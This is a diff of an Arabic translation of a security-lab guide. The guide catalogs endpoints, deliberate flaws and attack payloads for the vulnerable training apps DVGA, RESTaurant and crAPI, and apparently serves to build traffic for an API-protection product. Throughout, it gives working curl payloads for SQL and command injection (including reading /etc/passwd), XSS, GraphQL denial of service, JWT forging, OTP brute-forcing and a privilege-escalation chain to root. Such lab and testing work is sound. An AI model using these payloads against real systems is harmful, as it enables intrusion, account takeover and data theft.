@@ -1,9 +1,9 @@
 ---
-title: API Testing Guide
+title: دليل اختبار واجهات برمجة التطبيقات
 description: >-
-  كتالوج شامل لنقاط النهاية، وتعيين الثغرات الأمنية، وحمولات الهجوم لتطبيقات
-  DVGA وRESTaurant وcrAPI — مرجع للإعداد لتوليد حركة المرور وتطوير ملف حماية
-  واجهات برمجة التطبيقات في F5 XC
+  كتالوج شامل لنقاط النهاية، وتخطيط الثغرات، وحمولات الهجوم لتطبيقات DVGA
+  وRESTaurant وcrAPI — مرجع تهيئة لتوليد حركة المرور وتطوير ملفات حماية واجهات
+  برمجة التطبيقات في F5 XC
 sidebar:
   order: 8
 i18n:
@@ -13,13 +13,13 @@ i18n:
 
 ## نظرة عامة
 
-يقوم هذا الدليل بفهرسة كل نقطة نهاية لواجهة برمجة التطبيقات، والثغرات الأمنية المقصودة، وحمولات الهجوم عبر تطبيقات اختبار أمان واجهات برمجة التطبيقات الثلاثة. استخدمه لبناء أنماط توليد حركة المرور لتطوير ملف حماية واجهات برمجة التطبيقات في F5 XC.
+يُصنّف هذا الدليل كل نقطة نهاية لواجهة برمجة التطبيقات، والثغرات المتعمدة، وحمولات الهجوم عبر تطبيقات اختبار أمان واجهات برمجة التطبيقات الثلاثة. استخدمه لبناء أنماط توليد حركة المرور لتطوير ملفات حماية واجهات برمجة التطبيقات في F5 XC.
 
-| التطبيق | البروتوكول | المسار | المنفذ | المصادقة | الثغرات الأمنية |
+| التطبيق | البروتوكول | المسار | المنفذ | المصادقة | الثغرات |
 |---|---|---|---|---|---|
-| **DVGA** | GraphQL | `/dvga/` | 80 | لا يوجد (مسؤول: admin/password) | 25 سيناريو |
-| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (مُرمَّز بالنموذج) | 7 فئات من OWASP API 2023 |
-| **crAPI** | REST (خدمات مصغرة) | `/` | 8888 | JWT (Bearer) | أكثر من 18 تحدي |
+| **DVGA** | GraphQL | `/dvga/` | 80 | لا يوجد (المسؤول: admin/password) | 25 سيناريو |
+| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (ترميز النماذج) | 7 فئات من OWASP API 2023 |
+| **crAPI** | REST (خدمات مصغرة) | `/` | 8888 | JWT (Bearer) | أكثر من 18 تحدياً |
 
 ### متغيرات البيئة
 
@@ -36,7 +36,7 @@ CRAPI="http://<ORIGIN_IP>:8888"
 **واجهة GraphiQL:** `GET ${ORIGIN}/dvga/`
 **بيانات اعتماد المسؤول:** admin / password
 
-تستخدم جميع تفاعلات DVGA نقطة نهاية واحدة (`/dvga/graphql`) مع طلبات POST تحتوي على حمولات JSON بصيغة `{"query":"..."}`.
+تستخدم جميع تفاعلات DVGA نقطة نهاية واحدة (`/dvga/graphql`) مع طلبات POST تحتوي على حمولات JSON `{"query":"..."}`.
 
 ### نظرة عامة على المخطط
 
@@ -51,17 +51,17 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
 
 | العملية | النوع | المصادقة | الغرض |
 |---|---|---|---|
-| `pastes(public, filter, limit)` | Query | لا | قائمة اللصقات (حقن SQL عبر filter) |
-| `paste(id)` | Query | لا | الحصول على لصقة واحدة |
-| `me(token)` | Query | لا | الحصول على المستخدم عبر JWT (عرضة للتزوير) |
-| `systemHealth` | Query | لا | فحص صحة النظام |
-| `systemUpdate` | Query | لا | استعلام بطيء (~82 ثانية، ناقل لهجوم حجب الخدمة) |
-| `systemDiagnostics(cmd)` | Query | admin/password | تنفيذ أوامر نظام التشغيل المسموح بها |
-| `createPaste(title, content, public)` | Mutation | لا | إنشاء لصقة (XSS عبر content) |
-| `importPaste(host, port, path, scheme)` | Mutation | لا | استيراد لصقة عن بُعد (SSRF، حقن أوامر) |
-| `uploadPaste(filename, content)` | Mutation | لا | رفع لصقة (اجتياز المسار) |
+| `pastes(public, filter, limit)` | استعلام | لا | عرض اللصقات (حقن SQL عبر filter) |
+| `paste(id)` | استعلام | لا | جلب لصقة واحدة |
+| `me(token)` | استعلام | لا | جلب المستخدم عبر JWT (قابل للتزوير) |
+| `systemHealth` | استعلام | لا | فحص الصحة |
+| `systemUpdate` | استعلام | لا | استعلام بطيء (~82 ثانية، متجه حجب الخدمة) |
+| `systemDiagnostics(cmd)` | استعلام | admin/password | تنفيذ أوامر نظام التشغيل المُدرجة في القائمة البيضاء |
+| `createPaste(title, content, public)` | طفرة | لا | إنشاء لصقة (XSS عبر المحتوى) |
+| `importPaste(host, port, path, scheme)` | طفرة | لا | استيراد لصقة عن بُعد (SSRF، حقن أوامر) |
+| `uploadPaste(filename, content)` | طفرة | لا | رفع لصقة (اجتياز المسار) |
 
-### كتالوج الثغرات الأمنية
+### كتالوج الثغرات
 
 #### 1. حجب الخدمة (6 سيناريوهات)
 
@@ -72,7 +72,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
 ```
 
-**التكرار العميق (مراجع دائرية بين Owner/Paste):**
+**العودية العميقة (مراجع دائرية بين Owner وPaste):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -93,7 +93,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**هجوم قائم على الأسماء المستعارة (1000 عملية مستعارة):**
+**هجوم قائم على الأسماء المستعارة (1000 عملية باسم مستعار):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -102,14 +102,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 #### 2. كشف المعلومات (5 سيناريوهات)
 
-**الاستقصاء (تعداد المخطط الكامل):**
+**الاستبطان (تعداد المخطط الكامل):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**اقتراحات الحقول (الخطأ الإملائي يكشف الحقول الصالحة):**
+**اقتراحات الحقول (الخطأ المطبعي يكشف الحقول الصالحة):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -132,7 +132,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
 ```
 
-**XSS مخزّن عبر createPaste:**
+**XSS مُخزّن عبر createPaste:**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -146,7 +146,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
 ```
 
-#### 4. تنفيذ التعليمات البرمجية (3 سيناريوهات)
+#### 4. تنفيذ الأكواد (3 سيناريوهات)
 
 **حقن أوامر نظام التشغيل عبر importPaste:**
 ```bash
@@ -155,7 +155,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
 ```
 
-**أمر نظام التشغيل عبر systemDiagnostics (يتطلب مصادقة المسؤول):**
+**أوامر نظام التشغيل عبر systemDiagnostics (تتطلب مصادقة المسؤول):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -180,12 +180,12 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 ---
 
-## واجهة RESTaurant API (مطعم معرّض للثغرات)
+## واجهة برمجة تطبيقات RESTaurant (مطعم معرّض للثغرات)
 
 **واجهة Swagger:** `${ORIGIN}/restaurant/docs`
 **مواصفات OpenAPI:** `${ORIGIN}/restaurant/openapi.json`
-**المصادقة:** JWT عبر POST مُرمَّز بالنموذج إلى `/restaurant/token`
-**الأدوار:** عميل (افتراضي)، موظف، شيف (مسؤول)
+**المصادقة:** JWT عبر POST بترميز النماذج إلى `/restaurant/token`
+**الأدوار:** عميل (افتراضي)، موظف، طاهٍ رئيسي (مسؤول)
 
 ### الإعداد: التسجيل والمصادقة
 
@@ -205,16 +205,16 @@ echo "Bearer token: ${TOKEN}"
 
 ### مرجع نقاط النهاية
 
-| نقطة النهاية | الطريقة | المصادقة | الدور | الثغرة الأمنية |
+| نقطة النهاية | الطريقة | المصادقة | الدور | الثغرة |
 |---|---|---|---|---|
 | `/restaurant/register` | POST | لا | — | إنشاء مستخدم |
-| `/restaurant/token` | POST | لا | — | JWT بسر ضعيف (97952) |
-| `/restaurant/healthcheck` | GET | لا | — | فحص صحة النظام |
+| `/restaurant/token` | POST | لا | — | JWT بمفتاح سري ضعيف (97952) |
+| `/restaurant/healthcheck` | GET | لا | — | فحص الصحة |
 | `/restaurant/profile` | GET | نعم | أي | ملف المستخدم |
 | `/restaurant/profile` | PUT | نعم | أي | **BOLA** (تعديل مستخدمين آخرين) |
 | `/restaurant/profile` | PATCH | نعم | أي | **BOPLA** (تعيين جماعي للدور) |
 | `/restaurant/users/update_role` | PUT | نعم | أي | **BFLA** (تصعيد الدور) |
-| `/restaurant/menu` | GET | نعم | أي | قائمة عناصر القائمة |
+| `/restaurant/menu` | GET | نعم | أي | عرض عناصر القائمة |
 | `/restaurant/menu` | PUT | نعم | موظف+ | إنشاء قائمة (**SSRF** عبر الصورة) |
 | `/restaurant/menu/{item_id}` | PUT | نعم | موظف+ | تحديث القائمة (**SSRF** عبر الصورة) |
 | `/restaurant/menu/{item_id}` | DELETE | نعم | أي | **BFLA** (أي مستخدم يمكنه الحذف) |
@@ -222,16 +222,16 @@ echo "Bearer token: ${TOKEN}"
 | `/restaurant/orders` | POST | نعم | أي | إنشاء طلب |
 | `/restaurant/orders/{order_id}` | GET | نعم | أي | **BOLA** (الوصول لطلبات الآخرين) |
 | `/restaurant/orders/status/{order_id}` | GET | نعم | أي | حالة الطلب |
-| `/restaurant/admin/stats/disk` | GET | نعم | شيف | **حقن أوامر** |
+| `/restaurant/admin/stats/disk` | GET | نعم | طاهٍ رئيسي | **حقن أوامر** |
 | `/restaurant/reset-password` | POST | لا | — | طلب إعادة تعيين كلمة المرور |
 | `/restaurant/reset-password/new-password` | POST | لا | — | تعيين كلمة مرور جديدة |
 | `/restaurant/referral-code` | GET | نعم | أي | الحصول على رمز الإحالة |
 | `/restaurant/apply-referral` | POST | نعم | أي | تطبيق الإحالة |
-| `/restaurant/discount-coupons` | GET | نعم | أي | قائمة القسائم |
+| `/restaurant/discount-coupons` | GET | نعم | أي | عرض القسائم |
 
-### كتالوج الثغرات الأمنية
+### كتالوج الثغرات
 
-#### API1:2023 — تفويض معطل على مستوى الكائنات (BOLA)
+#### API1:2023 — ثغرة تفويض مستوى الكائن المكسور (BOLA)
 
 **تعديل ملف مستخدم آخر:**
 ```bash
@@ -241,7 +241,7 @@ curl -X PUT ${ORIGIN}/restaurant/profile \
   -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
 ```
 
-**الوصول لطلبات مستخدمين آخرين (تعداد الإزاحة):**
+**الوصول إلى طلبات مستخدمين آخرين (تعداد الإزاحة):**
 ```bash
 for i in 1 2 3 4 5; do
   curl -sf ${ORIGIN}/restaurant/orders/${i} \
@@ -250,9 +250,9 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### API2:2023 — مصادقة معطلة
+#### API2:2023 — المصادقة المكسورة
 
-**هجوم القوة الغاشمة على سر JWT الضعيف (السر 6 أرقام: 97952):**
+**هجوم القوة الغاشمة على المفتاح السري الضعيف لـ JWT (المفتاح السري 6 أرقام: 97952):**
 ```bash
 # Decode and forge tokens at jwt.io
 # Secret: 97952 (brute-forceable with hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')
@@ -263,9 +263,9 @@ done
 # Sign with secret: 97952
 ```
 
-#### API3:2023 — تفويض معطل على مستوى خصائص الكائنات (BOPLA)
+#### API3:2023 — ثغرة تفويض مستوى خاصية الكائن المكسور (BOPLA)
 
-**تعيين جماعي للدور من عميل إلى شيف:**
+**تعيين جماعي للدور من عميل إلى طاهٍ رئيسي:**
 ```bash
 curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -273,7 +273,7 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -d '{"role":"Chef"}'
 ```
 
-**مسار التصعيد: عميل → موظف → شيف:**
+**مسار التصعيد: عميل → موظف → طاهٍ رئيسي:**
 ```bash
 # Step 1: Escalate to Employee
 curl -X PATCH ${ORIGIN}/restaurant/profile \
@@ -288,9 +288,9 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -d '{"role":"Chef"}'
 ```
 
-#### API5:2023 — تفويض معطل على مستوى الوظائف (BFLA)
+#### API5:2023 — ثغرة تفويض مستوى الوظيفة المكسور (BFLA)
 
-**حذف عنصر من القائمة كعميل (يجب أن يتطلب دور موظف+):**
+**حذف عنصر من القائمة كعميل (يجب أن يتطلب موظف+):**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
@@ -317,7 +317,7 @@ curl -X PUT ${ORIGIN}/restaurant/menu \
 
 #### API8:2023 — الحقن
 
-**حقن أوامر نظام التشغيل عبر إحصائيات القرص (يتطلب دور شيف):**
+**حقن أوامر نظام التشغيل عبر إحصائيات القرص (يتطلب دور الطاهي الرئيسي):**
 ```bash
 # After escalating to Chef:
 curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
@@ -327,7 +327,7 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### سلسلة الهجوم الكاملة: من عميل إلى جذر النظام
+### سلسلة الهجوم الكاملة: من عميل إلى صلاحيات الجذر
 
 ```bash
 # 1. Register
@@ -361,9 +361,9 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 **واجهة الويب:** `${CRAPI}/`
 **MailHog:** `${CRAPI}/mailhog/` (التقاط البريد الإلكتروني للتحقق)
 **المصادقة:** رمز JWT Bearer (RS256، عرضة لخلط الخوارزميات)
-**البنية:** 7 خدمات مصغرة (identity, community, workshop, postgres, mongo, mailhog, web)
+**البنية:** 7 خدمات مصغرة (identity، community، workshop، postgres، mongo، mailhog، web)
 
-### الإعداد: التسجيل، التحقق من البريد الإلكتروني، تسجيل الدخول
+### الإعداد: التسجيل والتحقق من البريد الإلكتروني وتسجيل الدخول
 
 ```bash
 # 1. Register
@@ -392,16 +392,16 @@ echo "Bearer token: ${TOKEN}"
 
 #### خدمة الهوية
 
-| نقطة النهاية | الطريقة | المصادقة | الثغرة الأمنية |
+| نقطة النهاية | الطريقة | المصادقة | الثغرة |
 |---|---|---|---|
 | `/identity/api/auth/signup` | POST | لا | التسجيل |
 | `/identity/api/auth/login` | POST | لا | رمز JWT (خلط الخوارزميات) |
 | `/identity/api/auth/forget-password` | POST | لا | طلب OTP |
-| `/identity/api/auth/v2/check-otp` | POST | لا | **بدون حد للمعدل** (هجوم القوة الغاشمة على OTP المكون من 4 أرقام) |
-| `/identity/api/auth/v3/check-otp` | POST | لا | نسخة محدودة المعدل |
+| `/identity/api/auth/v2/check-otp` | POST | لا | **بدون حد للمعدل** (هجوم القوة الغاشمة على OTP من 4 أرقام) |
+| `/identity/api/auth/v3/check-otp` | POST | لا | إصدار محدود المعدل |
 | `/identity/api/v2/user/dashboard` | GET | نعم | ملف المستخدم |
 | `/identity/api/v2/user/change-email` | PUT | نعم | تغيير البريد الإلكتروني |
-| `/identity/api/v2/vehicle/vehicles` | GET | نعم | قائمة المركبات (تسريب UUIDs) |
+| `/identity/api/v2/vehicle/vehicles` | GET | نعم | عرض المركبات (يسرّب UUIDs) |
 | `/identity/api/v2/vehicle/{uuid}/location` | GET | نعم | **BOLA** (مركبة أي مستخدم) |
 | `/identity/api/v2/user/videos` | POST | نعم | رفع فيديو |
 | `/identity/api/v2/user/videos/{id}` | GET | نعم | **كشف البيانات** (conversion_params) |
@@ -410,23 +410,23 @@ echo "Bearer token: ${TOKEN}"
 
 #### خدمة المجتمع
 
-| نقطة النهاية | الطريقة | المصادقة | الثغرة الأمنية |
+| نقطة النهاية | الطريقة | المصادقة | الثغرة |
 |---|---|---|---|
-| `/community/api/v2/community/posts` | GET | نعم | **كشف البيانات** (تسريب vehicle_id، email) |
+| `/community/api/v2/community/posts` | GET | نعم | **كشف البيانات** (يسرّب vehicle_id والبريد الإلكتروني) |
 | `/community/api/v2/community/posts` | POST | نعم | إنشاء منشور مدونة |
 | `/community/api/v2/community/posts/{id}/comments` | POST | نعم | إضافة تعليق |
 | `/community/api/v2/coupon/validate-coupon` | POST | نعم | **حقن NoSQL** |
 
 #### خدمة الورشة
 
-| نقطة النهاية | الطريقة | المصادقة | الثغرة الأمنية |
+| نقطة النهاية | الطريقة | المصادقة | الثغرة |
 |---|---|---|---|
-| `/workshop/api/mechanic` | GET | نعم | **كشف البيانات** (بريد الميكانيكيين) |
-| `/workshop/api/mechanic/mechanic_report` | GET | لا | **BOLA** (بدون مصادقة، معرفات تسلسلية) |
+| `/workshop/api/mechanic` | GET | نعم | **كشف البيانات** (بريد الميكانيكيين الإلكتروني) |
+| `/workshop/api/mechanic/mechanic_report` | GET | لا | **BOLA** (بدون مصادقة، معرّفات تسلسلية) |
 | `/workshop/api/merchant/contact_mechanic` | POST | نعم | **SSRF** + **حجب الخدمة** |
 | `/workshop/api/shop/products` | GET | نعم | كتالوج المنتجات |
 | `/workshop/api/shop/orders/` | POST | نعم | إنشاء طلب |
-| `/workshop/api/shop/orders/all` | GET | نعم | قائمة الطلبات |
+| `/workshop/api/shop/orders/all` | GET | نعم | عرض الطلبات |
 | `/workshop/api/shop/orders/{id}` | GET | لا | **BOLA** (بدون مصادقة مطلوبة) |
 | `/workshop/api/shop/orders/{id}` | PUT | نعم | **تعيين جماعي** (الحالة، الكمية) |
 | `/workshop/api/shop/apply_coupon` | POST | نعم | **حقن SQL** |
@@ -445,7 +445,7 @@ curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### التحدي 2 — BOLA: الوصول إلى تقارير الميكانيكي (بدون مصادقة)
+#### التحدي 2 — BOLA: الوصول إلى تقارير الميكانيكيين (بدون مصادقة)
 
 ```bash
 # Sequential ID enumeration — no token needed
@@ -456,7 +456,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### التحدي 3 — مصادقة معطلة: هجوم القوة الغاشمة على OTP إعادة تعيين كلمة المرور
+#### التحدي 3 — المصادقة المكسورة: هجوم القوة الغاشمة على OTP لإعادة تعيين كلمة المرور
 
 ```bash
 # Request OTP for victim
@@ -513,7 +513,7 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### التحديان 8 و 9 — التعيين الجماعي: عناصر مجانية عبر التلاعب بالطلبات
+#### التحديان 8 و9 — التعيين الجماعي: عناصر مجانية عبر التلاعب بالطلبات
 
 ```bash
 # Change GET to PUT, modify status and quantity
@@ -566,7 +566,7 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### التحدي 14 — الوصول للطلبات بدون مصادقة
+#### التحدي 14 — الوصول إلى الطلبات بدون مصادقة
 
 ```bash
 # No Authorization header — still returns data
@@ -576,7 +576,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### التحدي 15 — خلط خوارزميات JWT
+#### التحدي 15 — خلط خوارزمية JWT
 
 ```bash
 # Forge a JWT with algorithm "none" (no signature verification):
@@ -593,21 +593,21 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 ---
 
-## مرجع OWASP API Security Top 10 المتقاطع
+## مرجع تقاطعي لقائمة OWASP لأهم 10 تهديدات لأمان واجهات برمجة التطبيقات
 
 | فئة OWASP | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
-| **API1: BOLA** | — | `PUT /profile`، `GET /orders/{id}` | موقع المركبة، تقارير الميكانيكي، الطلبات |
-| **API2: مصادقة معطلة** | تزوير JWT (استعلام `me`) | سر JWT ضعيف (97952) | هجوم القوة الغاشمة على OTP (v2)، خلط خوارزميات JWT |
-| **API3: BOPLA** | — | `PATCH /profile` (تصعيد الدور) | معاملات تحويل الفيديو، كشف بريد الميكانيكي |
-| **API4: استهلاك الموارد** | هجمات التجميع، التكرار، الأسماء المستعارة، تكرار الحقول لحجب الخدمة | تعداد المستخدمين عبر طول الاستجابة | حجب خدمة `contact_mechanic` عبر repeat_request |
+| **API1: BOLA** | — | `PUT /profile`، `GET /orders/{id}` | موقع المركبة، تقارير الميكانيكيين، الطلبات |
+| **API2: المصادقة المكسورة** | تزوير JWT (استعلام `me`) | مفتاح JWT السري الضعيف (97952) | هجوم القوة الغاشمة على OTP (v2)، خلط خوارزمية JWT |
+| **API3: BOPLA** | — | `PATCH /profile` (تصعيد الدور) | معاملات تحويل الفيديو، كشف بريد الميكانيكيين |
+| **API4: استهلاك الموارد** | حجب الخدمة عبر التجميع، العودية، الأسماء المستعارة، تكرار الحقول | تعداد المستخدمين عبر طول الاستجابة | حجب الخدمة عبر `contact_mechanic` repeat_request |
 | **API5: BFLA** | — | `DELETE /menu`، `PUT /users/update_role` | `DELETE /admin/videos` كمستخدم عادي |
 | **API6: التعيين الجماعي** | — | `PUT /orders` (الحالة، الكمية) | حالة/كمية الطلب، معاملات تحويل الفيديو |
-| **API7: SSRF** | تحويل `importPaste` | `PUT /menu` عبر image_url | عنوان URL في `contact_mechanic` عبر mechanic_api |
+| **API7: SSRF** | طفرة `importPaste` | `PUT /menu` image_url | رابط `contact_mechanic` mechanic_api |
 | **API8: الحقن** | SQL (`filter`)، XSS (`content`)، أوامر نظام التشغيل (`importPaste`، `systemDiagnostics`) | أوامر نظام التشغيل (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`)، SQL (`apply_coupon`) |
-| **API9: أصول غير صحيحة** | — | — | نسخة مهملة `/auth/v2/check-otp` (بدون حد للمعدل) |
-| **API10: استهلاك غير آمن** | — | — | (غير مباشر عبر SSRF) |
-| **خاص بـ GraphQL** | الاستقصاء، التجميع، التكرار، الأسماء المستعارة، تكرار الحقول، الأجزاء الدائرية | — | — |
+| **API9: الأصول غير الملائمة** | — | — | `/auth/v2/check-otp` المُهمل (بدون حد للمعدل) |
+| **API10: الاستهلاك غير الآمن** | — | — | (بشكل غير مباشر عبر SSRF) |
+| **خاص بـ GraphQL** | الاستبطان، التجميع، العودية، الأسماء المستعارة، تكرار الحقول، الأجزاء الدائرية | — | — |
 
 ---
 
@@ -615,7 +615,7 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 ### المرحلة 1: خط الأساس (المسار الطبيعي)
 
-قم بتوليد حركة مرور مشروعة لتأسيس سلوك واجهة برمجة التطبيقات الطبيعي قبل اختبار أنماط الهجوم.
+قم بتوليد حركة مرور مشروعة لتحديد السلوك الطبيعي لواجهة برمجة التطبيقات قبل اختبار أنماط الهجوم.
 
 **خط أساس DVGA:**
 ```bash
@@ -640,31 +640,31 @@ curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${T
 
 ### المرحلة 2: حركة مرور الهجوم حسب فئة OWASP
 
-**اختبار BOLA:** تعداد المعرفات التسلسلية، تبديل معرفات المستخدمين في الطلبات، الوصول إلى الموارد بدون ملكية.
+**اختبار BOLA:** تعداد المعرّفات التسلسلية، تبديل معرّفات المستخدمين في الطلبات، الوصول إلى الموارد بدون ملكية.
 
 **اختبار الحقن:** حمولات SQL في معاملات filter/coupon، حقن استعلامات GraphQL، حقن أوامر نظام التشغيل عبر حقول المعاملات.
 
-**اختبار تجاوز المصادقة:** تزوير رموز JWT، هجوم القوة الغاشمة على OTP، استخدام إصدارات واجهة برمجة التطبيقات المهملة، خلط الخوارزميات.
+**اختبار تجاوز المصادقة:** تزوير رموز JWT، هجوم القوة الغاشمة على OTP، استخدام إصدارات API المُهملة، خلط الخوارزميات.
 
 **اختبار SSRF:** عناوين URL داخلية في معاملات `importPaste` و`image_url` و`mechanic_api`.
 
-**اختبار حجب الخدمة:** هجمات التجميع/التكرار/الأسماء المستعارة في GraphQL، `repeat_request_if_failed` بأعداد عالية.
+**اختبار حجب الخدمة:** هجمات التجميع/العودية/الأسماء المستعارة في GraphQL، `repeat_request_if_failed` بأعداد عالية.
 
-### المرحلة 3: سلاسل الهجوم متعددة الحالات
+### المرحلة 3: سلاسل الهجوم ذات الحالة
 
 تتطلب بعض الهجمات تسلسلات متعددة الخطوات مع حالة:
 
-1. **سلسلة تصعيد RESTaurant:** تسجيل → رمز → PATCH للدور إلى شيف → إعادة المصادقة → حقن الأوامر
+1. **سلسلة تصعيد RESTaurant:** تسجيل → رمز → تصحيح الدور إلى طاهٍ رئيسي → إعادة المصادقة → حقن أوامر
 2. **التدفق الكامل لـ crAPI:** التسجيل → التحقق من البريد الإلكتروني (MailHog) → تسجيل الدخول → إضافة مركبة → الاتصال بالميكانيكي (SSRF) → التلاعب بالطلبات
-3. **من الاستطلاع إلى الاستغلال في DVGA:** الاستقصاء → اكتشاف systemDiagnostics → هجوم القوة الغاشمة على بيانات اعتماد المسؤول → تنفيذ أوامر نظام التشغيل
+3. **من الاستطلاع إلى الاستغلال في DVGA:** الاستبطان → اكتشاف systemDiagnostics → هجوم القوة الغاشمة على بيانات اعتماد المسؤول → تنفيذ أوامر نظام التشغيل
 
 ### توصيات المعدل
 
 | النمط | الطلبات/ثانية | المدة | ملاحظات |
 |---|---|---|---|
-| خط الأساس (لكل تطبيق) | 10-50 | 5 دقائق | تأسيس بصمة حركة المرور الطبيعية |
-| تعداد BOLA | 100-500 | 2 دقيقة | مسح المعرفات التسلسلية |
-| هجوم القوة الغاشمة على OTP | أكثر من 1000 | حتى الإيجاد | 10,000 محاولة كحد أقصى (4 أرقام) |
-| حجب خدمة GraphQL | 10-50 | 30 ثانية | كل طلب مكلف من جانب الخادم |
-| فحص الحقن | 50-200 | 5 دقائق | تنويع الحمولات لكل طلب |
+| خط الأساس (لكل تطبيق) | 10-50 | 5 دقائق | تحديد البصمة الطبيعية لحركة المرور |
+| تعداد BOLA | 100-500 | 2 دقيقة | مسح المعرّفات التسلسلية |
+| هجوم القوة الغاشمة على OTP | أكثر من 1000 | حتى الاكتشاف | 10,000 محاولة كحد أقصى (4 أرقام) |
+| حجب خدمة GraphQL | 10-50 | 30 ثانية | كل طلب مُكلف من جانب الخادم |
+| اختبار الحقن العشوائي | 50-200 | 5 دقائق | تنويع الحمولات لكل طلب |
 | فحص SSRF | 5-20 | 2 دقيقة | بطيء؛ كل طلب يُطلق طلب HTTP من جانب الخادم |
